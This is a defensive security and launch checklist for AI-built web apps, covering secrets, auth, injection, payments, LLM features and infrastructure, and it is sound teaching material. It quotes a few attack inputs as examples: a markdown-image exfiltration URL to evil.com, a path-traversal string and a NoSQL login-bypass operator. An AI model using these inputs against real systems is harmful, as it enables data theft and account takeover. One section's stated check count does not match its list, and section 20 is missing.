## 0. Classic fumbles

**Priority:** Start here · **Checks:** 35

The mistakes that show up in vibe-coded apps again and again, each paired with its fix. If you only have ten minutes, start here.

- [ ] **Supabase `service_role` key shipped in the frontend** → Frontend uses the anon key only; service role lives server-side. Rotate it now.
- [ ] **RLS "enabled" with a `using (true)` policy** → Write per-table, per-action policies scoped to `auth.uid()`.
- [ ] **Firebase left in test mode (`allow read, write: if true`)** → Write real rules before launch. Test mode is wide open, then expires and breaks.
- [ ] **`.env` committed, then "deleted" in the next commit** → It's still in history. Rotate every key, then purge with `git filter-repo`.
- [ ] **API key in a `NEXT_PUBLIC_` / `VITE_` variable** → Move the call to a server route; rotate the key.
- [ ] **Paywall checked in the UI only (`if (user.isPro)`)** → Check the plan on the server for every paid action and API call.
- [ ] **Paid access granted on the Stripe success URL** → Grant access from the verified `checkout.session.completed` webhook.
- [ ] **Price or amount sent from the browser** → Server looks up price IDs; the client sends only the product.
- [ ] **`userId` read from the request body** → Use the user from the verified session.
- [ ] **Admin check is `email.endsWith('@mycompany.com')` on an unverified email** → Verified email + a server-side roles table.
- [ ] **Seed admin `admin / admin123` still exists** → Delete it, and the seed script's access to prod.
- [ ] **`/api/seed`, `/api/reset`, `/api/test`, `/api/debug` shipped to prod** → Delete them or gate behind env + admin auth.
- [ ] **CORS set to `*` because it "fixed the error"** → Allow-list your actual origins.
- [ ] **`dangerouslySetInnerHTML` / `v-html` / `innerHTML` on user or AI content** → Sanitize with DOMPurify, or render as text.
- [ ] **JWT secret is `secret` or copied from the tutorial** → Generate 32+ random bytes and rotate it. It logs everyone out, which is fine.
- [ ] **Rate limiter stored in memory on serverless** → Each instance has its own counter, so it does nothing. Use Redis/Upstash or your platform's limiter.
- [ ] **Open AI endpoint with no auth and no cap** → Auth + per-user quota + provider spending cap, or wake up to a $10k bill.
- [ ] **Dev and prod share one database** → Separate databases. The AI agent never gets prod credentials.
- [ ] **AI agent ran a migration / `DROP` against prod** → Backups with tested restore, PITR on, and agents only touch dev.
- [ ] **AI "fixed" failing tests by deleting or skipping them** → Review every diff to tests; CI fails on `.skip` / `.only`.
- [ ] **AI silenced errors to make the build pass (`@ts-ignore`, `eslint-disable`, `any`, empty `catch`)** → Grep for them before every release.
- [ ] **AI excluded routes from auth middleware to stop a redirect loop** → Check the middleware `matcher` and make sure protected routes are still covered.
- [ ] **AI installed a package that didn't exist yesterday** → Check age, downloads and repo before installing anything new.
- [ ] **Login says "user not found" vs "wrong password"** → One generic message, same timing.
- [ ] **`emailVerified` / `role` field writable by the user's own profile update** → Allow-list updatable fields server-side.
- [ ] **Public S3 / storage bucket "just for testing"** → Private bucket + signed URLs. Check it's actually private.
- [ ] **Uploaded SVG pops an alert box** → Sanitize SVGs or serve uploads as attachments from another domain.
- [ ] **Server fetches any URL a user pastes** → SSRF: block internal IPs and cloud metadata endpoints.
- [ ] **Password reset token in the URL leaks via `Referer` and analytics** → `Referrer-Policy: no-referrer` on reset pages; single-use, short-lived tokens.
- [ ] **Logging full request bodies, so passwords end up in logs** → Redact sensitive fields at the logger.
- [ ] **`/.git` or `/.env` reachable on the live site** → Block dotfiles at the server/CDN; make sure they're not in the deploy output.
- [ ] **Public source maps hand out your whole frontend source** → Disable in prod or upload privately to Sentry.
- [ ] **Preview deploy wired to prod DB and indexed by Google** → Preview env vars + `noindex` + password protection.
- [ ] **Domain expired / registrar account had no 2FA** → Auto-renew, registrar lock and 2FA. Lose the domain and you lose everything.
- [ ] **No backups until the day you needed one** → Automated backups and a restore you've actually tested.

## 1. Secrets & keys

**Priority:** Ship-blocker · **Checks:** 10

Keys leak through git history, browser bundles and copy-paste. Once a key is out, assume someone is using it.

- [ ] **Never commit `.env`**: add `.env*` to `.gitignore` *before* the first commit; ship a `.env.example` with dummy values.
- [ ] **Scan git history for secrets**: a key deleted in a later commit is still in history. Use `gitleaks` / `trufflehog`; rotate anything found.
- [ ] **Keep secret keys out of the browser**: anything in client JS (or prefixed `NEXT_PUBLIC_`, `VITE_`, `EXPO_PUBLIC_`) is public.
- [ ] **Hide API keys behind your server**: the frontend calls *your* endpoint, your server calls the third-party API.
- [ ] **Use live payment keys in production only**: test keys everywhere else, never mixed.
- [ ] **Rotate any key that's been exposed**: pasted into an AI chat, a screenshot, Discord or a public repo counts as leaked.
- [ ] **Separate keys per environment**: dev, preview and prod never share keys, DBs or OAuth apps.
- [ ] **Use a secrets manager**: Doppler, 1Password, Vault or your platform's env vars, not a shared `.env` in Slack.
- [ ] **Generate secrets properly**: 32+ random bytes from a crypto RNG. Never `secret`, `changeme` or the tutorial's example value.
- [ ] **Enable GitHub push protection**: secret scanning blocks a commit containing a key before it lands.

## 2. Authentication & sessions

**Priority:** Ship-blocker · **Checks:** 22

Who is this user, and how sure are you? Everything here is enforced on the server.

- [ ] **Check login on the server**: hiding a button on the client is not auth. Every protected route verifies the session server-side.
- [ ] **Block unauthenticated routes by default**: deny-by-default middleware, then explicitly open public routes.
- [ ] **Hash every password**: bcrypt / argon2 / scrypt. Never plain, never MD5/SHA1.
- [ ] **Enforce password rules**: sensible minimum length, check against breached-password lists.
- [ ] **Keep tokens in `httpOnly` cookies**: not `localStorage`. JavaScript (and XSS) can't read them.
- [ ] **Secure auth sessions**: short-lived tokens, refresh rotation, server-side invalidation on logout.
- [ ] **Reset all sessions on password change**: otherwise an attacker who's already in stays in.
- [ ] **Expire password-reset links**: valid for minutes, usable once.
- [ ] **Rate limit logins and password resets**: stops brute force and email bombing.
- [ ] **Lock or throttle accounts after repeated failed logins**: slows credential stuffing to a crawl.
- [ ] **Prevent account enumeration**: "If that email exists, we've sent a link." Same response and timing for valid and invalid accounts.
- [ ] **Verify emails before granting full access**: stops fake signups and squatting on someone else's address.
- [ ] **Offer MFA, and require it for admins**: a stolen password alone shouldn't be enough.
- [ ] **Configure OAuth correctly**: exact redirect URI allow-list, `state` param, PKCE, verify the `id_token`.
- [ ] **Test password reset end to end in production**: it's the flow that breaks silently when email config changes.
- [ ] **Verify JWTs properly**: check signature, `exp`, `iss`, `aud`; reject `alg: none`; never trust a decoded-but-unverified token.
- [ ] **No sensitive data in JWT payloads**: they're base64, not encrypted.
- [ ] **Regenerate the session ID on login**: prevents session fixation.
- [ ] **Make magic links, invite links and OTPs single-use and short-lived**: a forwarded email shouldn't be a permanent key.
- [ ] **Add bot protection to signup and login**: CAPTCHA or Turnstile, and block disposable emails if abuse matters.
- [ ] **Re-authenticate for sensitive actions**: changing email, password, payout details, deleting the account.
- [ ] **Hash MFA backup codes**: single-use, and the user can regenerate them.

## 3. Authorization & data access

**Priority:** Ship-blocker · **Checks:** 17

Logged in is not the same as allowed. Every request has to prove it can touch the data it asks for.

- [ ] **Write real row-level security (RLS) rules**: "enabled" with a `true` policy is not security. Each table: who can read, insert, update, delete.
- [ ] **Check who's admin on the server**: never from a client flag or a profile field the user can edit.
- [ ] **Put a login on the admin panel and lock admin routes**: a secret URL is not protection.
- [ ] **Remove default admin routes**: `/admin`, `/wp-admin`, framework defaults and seeded admin users are the first things bots try.
- [ ] **Don't expose internal dashboards**: DB studios, queue UIs, Grafana and Supabase/Firebase consoles stay off the public internet.
- [ ] **Test IDOR attacks**: change `/invoice/123` to `/invoice/124`. Can user A see user B's stuff?
- [ ] **Test user isolation and record access**: log in as two users and try to read or edit each other's data via the API, not just the UI.
- [ ] **Enforce tenant isolation**: in multi-tenant apps, every query is scoped to the tenant.
- [ ] **Use random IDs (UUID/ULID), not 1, 2, 3**: sequential IDs make enumeration trivial.
- [ ] **Enforce business logic server-side**: coupon reuse, negative quantities, skipping steps, free-trial farming.
- [ ] **Handle race conditions**: double-spend, double-redeem, double-submit. Use transactions, unique constraints, idempotency keys.
- [ ] **Fail closed**: if the auth/permission check errors, deny. Never `catch { allow }`.
- [ ] **Check ownership on update and delete**: not just on read. It's the classic half-done IDOR fix.
- [ ] **Lock storage rules separately**: Firebase and Supabase storage buckets have their own rules, apart from your tables.
- [ ] **Watch for RLS bypasses**: `SECURITY DEFINER` functions, views, and service-role server code all skip RLS.
- [ ] **Test vertical privilege escalation**: can a normal user hit admin-only API routes directly?
- [ ] **Take the user ID from the session**: never from the request body or query string.

## 4. Input handling & injection

**Priority:** Ship-blocker · **Checks:** 15

Treat every input as hostile: form fields, URLs, headers, files and AI output.

- [ ] **Validate all inputs on the server**: type, length, format and range, with Zod, Pydantic or Joi.
- [ ] **Use parameterized SQL or an ORM**: never string-concatenate queries, and test for SQL injection.
- [ ] **Sanitize user HTML**: run it through DOMPurify (or equivalent) before storing and again on render.
- [ ] **Only save the fields you expect**: block mass assignment and field tampering (`role: "admin"` in a profile update).
- [ ] **Block command injection**: never pass user input to `exec`/shell; use arg arrays.
- [ ] **Avoid insecure deserialization**: no `pickle`, `eval`, or unsafe YAML on untrusted data.
- [ ] **No open redirects**: validate `?next=` / `?redirect=` against an allow-list.
- [ ] **Protect against CSRF**: CSRF tokens, or SameSite cookies plus origin checks, on every state-changing request.
- [ ] **Block SSRF**: if the server fetches user-supplied URLs (link previews, webhooks, imports), block private IPs and `169.254.169.254` cloud metadata.
- [ ] **Block path traversal**: never build file paths from user input (`../../etc/passwd`); watch zip-slip on archive extraction.
- [ ] **Block NoSQL injection**: don't pass raw request objects into Mongo queries (`{ "$ne": null }` logs you in as anyone).
- [ ] **Block `javascript:` URLs**: in user-supplied links and rendered markdown they run code on click.
- [ ] **Avoid ReDoS**: no user input into complex regexes; set length limits first.
- [ ] **Block template injection and prototype pollution**: never render user input as a template, and don't deep-merge untrusted JSON into objects.
- [ ] **Use a crypto RNG for tokens**: `crypto.randomUUID` or `secrets`, never `Math.random()`.

## 5. APIs & endpoints

**Priority:** Ship-blocker · **Checks:** 12

Every endpoint is public the moment it's deployed, whether or not your UI links to it.

- [ ] **Rate limit every endpoint**: especially auth, signup, AI, email and anything expensive.
- [ ] **Limit request size**: body size, JSON depth and file size, so one request can't eat your server.
- [ ] **Trim API responses**: return only the fields the UI needs; never the whole user row with password hash.
- [ ] **Secure server logic**: pricing, permissions, limits live on the server, not in the bundle.
- [ ] **Lock CORS to your own domain**: no `*` with credentials.
- [ ] **Harden GraphQL**: limit query depth and complexity, disable introspection in prod, cap batching and aliases.
- [ ] **Set timeouts on every outbound call and DB query**: missing timeouts mean hung workers.
- [ ] **Inventory every endpoint**: anything forgotten (`/api/debug`, `/api/seed`) gets removed or locked.
- [ ] **Cap page sizes**: `?limit=1000000` shouldn't dump your database.
- [ ] **Protect cron and internal endpoints**: they're public URLs, so require a secret header or platform auth.
- [ ] **Disable debug mode in production**: `DEBUG=True`, `APP_DEBUG`, dev overlays and verbose ORM logging leak internals.
- [ ] **Use idempotency keys**: anything that creates money, orders or emails must survive a retry without doubling up.

## 6. Payments & webhooks

**Priority:** Ship-blocker · **Checks:** 9

Money flows are where business logic bugs turn into real losses.

- [ ] **Set prices server-side**: never trust an amount sent from the client.
- [ ] **Verify webhook signatures**: Stripe, GitHub and friends sign every event, so reject anything unsigned.
- [ ] **Prevent webhook replay**: check timestamps, store processed event IDs, make handlers idempotent.
- [ ] **Test the signup to paid flow**: end to end, with a real card in live mode, then refund it.
- [ ] **Show the full price up front**: no hidden fees at checkout.
- [ ] **Grant access from the webhook, not the success-page redirect**: anyone can visit `/success`.
- [ ] **Never touch raw card data**: use Stripe Checkout/Elements to stay out of PCI scope.
- [ ] **Handle the full subscription lifecycle**: failed payments, cancellations, refunds and disputes revoke access.
- [ ] **Check currency and amount on the webhook**: confirm they match what you expected before fulfilling.

## 7. AI & LLM features

**Priority:** Ship-blocker · **Checks:** 14

LLMs take instructions from anywhere, cost money per call and can be talked into things. Box them in.

- [ ] **Set an AI spending cap**: hard budget limits on every provider account.
- [ ] **Cap AI usage per user**: requests and tokens per day, so one account can't drain your budget.
- [ ] **Mitigate prompt injection**: treat user and retrieved content as data, not instructions, and keep system prompts and tools separate from user text.
- [ ] **Validate AI output**: schema-check structured output, never `eval` it or render it as raw HTML, and never run AI-generated SQL or shell without guards.
- [ ] **Give AI least-privilege permissions**: the model's tools and DB role can only do what that feature needs.
- [ ] **Enforce permissions in the AI tool layer**: the AI can't fetch another user's data just because it was "asked nicely".
- [ ] **Don't leak secrets via the prompt**: no keys, internal URLs or other users' data in context.
- [ ] **Watch for indirect prompt injection**: documents, emails, web pages and filenames the AI reads can carry instructions. Treat them as hostile.
- [ ] **Assume your system prompt will leak**: nothing secret goes in it.
- [ ] **Block markdown-image exfiltration**: don't auto-render images/links from AI output to arbitrary domains (`![](https://evil.com/?q=SECRET)`).
- [ ] **Require human approval for destructive tool calls**: sending, deleting, paying, deploying.
- [ ] **Make RAG respect permissions**: retrieval filters by the current user's access, not "everything in the vector DB".
- [ ] **Set the model and `max_tokens` on the server**: never let the client choose an expensive model or unbounded output.
- [ ] **Log every AI tool call**: who asked, what went in, what came out.

## 8. File uploads & storage

**Priority:** High · **Checks:** 7

A file upload is a stranger handing your server a package. Check what's inside and where it ends up.

- [ ] **Allow-list upload types**: check magic bytes, not just the extension.
- [ ] **Restrict file uploads**: size limits, rename files, store outside the web root, strip EXIF, scan if possible.
- [ ] **Lock storage buckets**: private by default, signed URLs for access, no public listing.
- [ ] **Disable directory listing**: nobody should be able to browse your upload folders.
- [ ] **Treat SVG and HTML uploads as code**: they can carry JavaScript, so sanitize them or serve with `Content-Disposition: attachment`.
- [ ] **Serve user uploads from a separate domain**: a CDN or bucket domain, so uploaded content can't read your cookies.
- [ ] **Keep signed URLs short-lived**: minutes not days, with content-type and size limits on uploads.

## 9. Transport, headers & cookies

**Priority:** High · **Checks:** 10

Browsers enforce a lot of security for free, but only if you send the right headers and flags.

- [ ] **Enforce HTTPS everywhere**: redirect every HTTP request to HTTPS.
- [ ] **Add HSTS**: tells browsers to only ever reach your domain over HTTPS.
- [ ] **Add security headers**: CSP, `X-Content-Type-Options`, `Referrer-Policy`, `frame-ancestors`/`X-Frame-Options`, `Permissions-Policy`.
- [ ] **Set secure cookie flags**: `Secure`, `HttpOnly`, `SameSite=Lax/Strict`.
- [ ] **Keep sensitive data out of browser storage**: `localStorage`, `sessionStorage` and IndexedDB are readable by any script on the page.
- [ ] **Encrypt data in transit and at rest**: plus field-level encryption for the really sensitive stuff.
- [ ] **Use Subresource Integrity (SRI)**: on third-party scripts from CDNs, so a compromised CDN can't inject code.
- [ ] **Allow TLS 1.2+ only**: with valid certificates that auto-renew.
- [ ] **Block dotfiles on your web server**: `/.git/config`, `/.env`, `/.DS_Store` must 404.
- [ ] **Don't ship public source maps**: upload them privately to your error tracker instead.

## 10. Database

**Priority:** High · **Checks:** 9

Your data is the product. Lock down who can reach it and make sure you can get it back.

- [ ] **Restrict database permissions**: the app user can't `DROP`; separate read/write roles where possible.
- [ ] **Use connection pooling**: PgBouncer, Supabase pooler or Prisma Accelerate, or serverless will exhaust your connections.
- [ ] **Back up and test restores**: a backup you've never restored is a hope, not a backup.
- [ ] **Wipe test data before launch**: fake users and orders pollute analytics and sometimes hold real emails.
- [ ] **Keep the database off the public internet**: no `0.0.0.0/0` on Postgres, Mongo, Redis or Elasticsearch. Use an IP allow-list or private network.
- [ ] **Change default credentials**: on every database, admin panel and service.
- [ ] **Encrypt backups**: and store them somewhere a compromised app can't delete them.
- [ ] **Review AI-written migrations before running them**: especially anything with `DROP`, `TRUNCATE` or `DELETE` without `WHERE`.
- [ ] **Turn on point-in-time recovery**: so you can rewind to the minute before it went wrong.

## 11. Dependencies & supply chain

**Priority:** High · **Checks:** 8

Most of your code was written by strangers. Know what you're installing.

- [ ] **Check a package exists before installing**: AI hallucinates package names and attackers register them ("slopsquatting").
- [ ] **Scan dependencies for vulnerabilities**: `npm audit`, Dependabot, Snyk or `pip-audit`.
- [ ] **Watch for malicious packages**: typosquats, brand-new packages, weird install scripts.
- [ ] **Pin dependencies and commit the lockfile**: prod installs exactly what you tested.
- [ ] **Audit third-party SDKs**: what data do your analytics/chat/ads scripts collect?
- [ ] **Review `postinstall` scripts**: on new dependencies, or install with `--ignore-scripts`.
- [ ] **Update dependencies on a schedule**: Renovate or Dependabot, not once a year.
- [ ] **Remove unused dependencies**: every package is attack surface.

## 12. CI/CD, accounts & infrastructure

**Priority:** High · **Checks:** 11

Your app is only as secure as the accounts and pipelines that deploy it.

- [ ] **Lock down CI/CD secrets**: scoped per environment, with least-privilege tokens.
- [ ] **Don't run untrusted build actions**: pin GitHub Actions to a commit SHA; be wary of `pull_request_target`.
- [ ] **Pin build dependencies**: base images, actions and tool versions.
- [ ] **Review all code before production**: at least a second pass, human or a separate AI review, on every merge.
- [ ] **Put risky features behind flags**: so you can kill something without a redeploy.
- [ ] **Turn on 2FA everywhere**: GitHub, domain registrar, DNS, hosting, database, email, Stripe, AI providers.
- [ ] **Turn on registrar lock and auto-renew**: for every domain you own.
- [ ] **Kill dangling DNS**: CNAMEs pointing at deleted Vercel/Heroku/S3 apps get taken over.
- [ ] **Isolate preview deployments**: no prod data, no prod keys, and not publicly indexable.
- [ ] **Give the team least-privilege access**: and offboard people the day they leave.
- [ ] **Protect `main`**: required reviews and passing checks before merge.

## 13. Logging, monitoring & recovery

**Priority:** High · **Checks:** 12

You can't fix what you can't see, and you can't recover from what you never planned for.

- [ ] **Hide stack traces in production**: generic error to the user, detail to your logs.
- [ ] **Strip `console.log`s from production**: anyone can open dev tools and read users, tokens and API responses.
- [ ] **Remove sensitive logs**: no passwords, tokens, full card numbers or PII in logs.
- [ ] **Log security events**: logins, failed logins, password changes, permission changes.
- [ ] **Keep audit logs**: for admin and data-changing actions, so you can answer "who did this?"
- [ ] **Set up error monitoring**: Sentry or similar, so you hear about bugs before users post about them.
- [ ] **Alert on suspicious activity**: login spikes, mass data access, new admin accounts.
- [ ] **Add uptime alerts**: know your site is down before your customers do.
- [ ] **Create a status page**: one place to tell users what's broken and when it's fixed.
- [ ] **Write an incident response plan**: who gets called, how you rotate every key, how you take the app offline.
- [ ] **Know your breach-notification duties**: GDPR gives you 72 hours, and Australia's Notifiable Data Breaches scheme and US state laws have their own rules.
- [ ] **Alert on cost spikes**: cloud, AI and email bills are often the first sign of abuse.

## 14. Attack your own app

**Priority:** Every release · **Checks:** 4

Do the attacker's job before they do, and repeat it before every big release.

- [ ] **Attack your own app**: before someone else does, try every item in this checklist as an attacker would.
- [ ] **Run an automated pentest**: [Strix](https://github.com/usestrix/strix) uses open-source AI agents to find and validate vulnerabilities.
- [ ] **Scan headers, TLS and performance**: securityheaders.com, SSL Labs and Lighthouse.
- [ ] **Re-run Vibe Check before every major release**: not just the first one.

## 15. Production readiness

**Priority:** Launch · **Checks:** 7

The difference between a demo and a product people trust.

- [ ] **Kill localhost URLs**: grep for `localhost`, `127.0.0.1`, ngrok and staging URLs.
- [ ] **Remove lorem ipsum**: and every other scrap of placeholder content.
- [ ] **Send email from your own domain**: with SPF, DKIM and DMARC set up, or your mail lands in spam.
- [ ] **Use a real support email**: one that someone actually reads.
- [ ] **Track signups and activation**: know whether people get value, not just whether they arrive.
- [ ] **Install analytics**: respecting the consent rules in section 18.
- [ ] **Use UTM tracking on campaigns**: so you know which channels actually work.

## 16. SEO & discoverability

**Priority:** Launch · **Checks:** 19

If search engines can't crawl it, nobody finds it.

- [ ] **Publish a `sitemap.xml`**: generated automatically and submitted to search engines.
- [ ] **Publish a `robots.txt`**: and make sure it isn't blocking everything.
- [ ] **Remove `noindex` tags**: leftovers from staging hide your whole site from Google.
- [ ] **Add canonical tags to every page**: tells search engines which URL is the real one.
- [ ] **Write a unique meta title for every page**: it's the headline in search results.
- [ ] **Write a unique meta description for every page**: it's the pitch under the headline.
- [ ] **Use one H1 per page**: it's the page's main topic for search engines and screen readers.
- [ ] **Fix heading hierarchy**: H1, then H2, then H3, with no skipped levels.
- [ ] **Add alt text to every image**: search engines read it, and so do screen readers.
- [ ] **Add schema markup**: JSON-LD for Organization, Product, Article, FAQ and so on, for rich results.
- [ ] **Add internal links between related pages**: helps crawlers and keeps readers moving.
- [ ] **Fix broken links**: they waste crawl budget and make the site look abandoned.
- [ ] **Compress images**: WebP or AVIF, correctly sized, lazy-loaded.
- [ ] **Improve Core Web Vitals**: LCP, INP and CLS are ranking signals.
- [ ] **Fix mobile responsiveness**: Google indexes the mobile version first.
- [ ] **Clean up URL slugs**: `/pricing`, not `/page?id=7`.
- [ ] **Verify Google Search Console**: and Bing Webmaster Tools, to see indexing errors and submit your sitemap.
- [ ] **Add `llms.txt`**: a plain summary of your site so AI assistants describe you correctly.
- [ ] **Build a backlink strategy**: links from reputable sites are still how you earn rank.

## 17. Social & sharing

**Priority:** Launch · **Checks:** 3

How your links look when shared decides whether anyone clicks.

- [ ] **Add an Open Graph image**: a 1200×630 `og:image` so shared links get a proper preview.
- [ ] **Add social metadata to every page**: Open Graph and Twitter/X card tags.
- [ ] **Add a custom favicon**: the full set (ICO, PNG sizes, Apple touch icon, manifest).

## 18. Legal, privacy & trust

**Priority:** Launch · **Checks:** 15

Not legal advice. Requirements differ by country (GDPR, CCPA, the Australian Privacy Act and more), so check what applies to you.

- [ ] **Publish a privacy policy**: what you collect, why, who you share it with, and how to get it deleted.
- [ ] **Publish terms of service**: the rules for using your product and the limits of your liability.
- [ ] **Publish a refund policy**: payment providers and consumer law expect one.
- [ ] **Add a cookie policy and a real consent banner**: non-essential cookies stay off until the user agrees (GDPR/ePrivacy).
- [ ] **Check form consents**: explicit, unticked opt-ins for marketing.
- [ ] **Collect only the data you need**: every extra field is a liability in a breach.
- [ ] **Handle data deletion requests**: have a process, and actually delete.
- [ ] **Put an unsubscribe link in every marketing email**: it's the law in most places.
- [ ] **Get age consent for kids' data**: COPPA, GDPR-K and local equivalents.
- [ ] **Remove dark patterns**: no trick cancellations, pre-ticked boxes or confirm-shaming.
- [ ] **Remove fake reviews and testimonials**: illegal in many countries, and trust dies when they're spotted.
- [ ] **Remove unsupported claims**: "#1", "bank-grade", "used by 10,000+". If you can't prove it, cut it.
- [ ] **Add business details**: legal name, ABN/company number where required.
- [ ] **Show a real contact address**: required for businesses in many countries, and it builds trust.
- [ ] **License fonts and images**: AI-grabbed assets are often not yours to use.

## 19. UX states & polish

**Priority:** Quality · **Checks:** 21

The small states and touches that make an app feel finished instead of generated.

- [ ] **Make a custom 404 page**: and a friendly 500 page, both with a way back.
- [ ] **Put a CTA above the fold**: visitors should see what to do without scrolling.
- [ ] **Add a sticky CTA on mobile**: the button stays in reach as people scroll.
- [ ] **Show loading states**: spinners or skeletons, so nothing looks frozen.
- [ ] **Show form error states**: inline, specific and human-readable.
- [ ] **Show form success states**: plus a thank-you page that says what happens next.
- [ ] **Confirm destructive actions**: a modal before delete, cancel or anything you can't undo.
- [ ] **Add hover states**: on everything clickable, so it's obvious what's interactive.
- [ ] **Make mobile menus work**: open, close, scroll and link correctly on a real phone.
- [ ] **Add a dark mode toggle**: default to the system setting via `prefers-color-scheme`.
- [ ] **Add site search**: once you have more than a handful of pages.
- [ ] **Add a back-to-top button**: on long pages.
- [ ] **Use a sticky header**: navigation stays reachable on long pages.

## 21. Accessibility

**Priority:** Quality · **Checks:** 5

Usable by everyone, including keyboard and screen reader users. A legal requirement in some places.

- [ ] **Write useful alt text**: describe meaningful images, and use empty `alt=""` on decorative ones.
- [ ] **Meet WCAG AA colour contrast**: 4.5:1 for body text.
- [ ] **Support keyboard navigation**: everything reachable and usable with Tab, Enter and Esc, with visible focus rings.
- [ ] **Add a "skip to content" link**: keyboard users shouldn't tab through your whole nav on every page.
- [ ] **Label every form field**: and make sure errors are announced to screen readers.
